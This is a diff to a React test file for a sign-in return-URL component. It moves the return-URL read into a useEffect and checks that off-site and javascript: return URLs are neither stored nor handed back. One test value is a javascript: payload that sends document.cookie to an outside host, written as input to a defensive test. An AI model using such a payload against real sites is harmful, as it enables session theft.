@@ -1,4 +1,4 @@
-import { act, FC, ReactNode } from 'react';
+import { act, FC, ReactNode, useEffect } from 'react';
 import { createRoot } from 'react-dom/client';
 
 let search = new URLSearchParams();
@@ -40,16 +40,19 @@ const render = async (element: ReactNode) => {
   return host;
 };
 
-// layout.context sends the browser to whatever getAndClear returns after
-// signing in.
+// layout.context sends the browser to whatever getAndClear returns once the
+// sign-in answer arrives, outside rendering.
 const readAfterSignIn = async () => {
-  let value: string | null | undefined;
+  const read = jest.fn();
   const Reader: FC = () => {
-    value = useReturnUrl().getAndClear();
+    const { getAndClear } = useReturnUrl();
+    useEffect(() => {
+      read(getAndClear());
+    }, [getAndClear]);
     return null;
   };
   await render(<Reader />);
-  return value;
+  return read.mock.calls[0][0];
 };
 
 beforeEach(() => {
@@ -79,7 +82,10 @@ describe('ReturnUrlComponent', () => {
 
   it.each([
     ['another site', 'https://example.com/phish'],
-    ['a javascript: URL', 'javascript:fetch("https://example.com/"+document.cookie)'],
+    [
+      'a javascript: URL',
+      'javascript:fetch("https://example.com/"+document.cookie)',
+    ],
   ])('neither stores nor hands back %s', async (_label, returnUrl) => {
     arrive(loginWith(returnUrl));
 
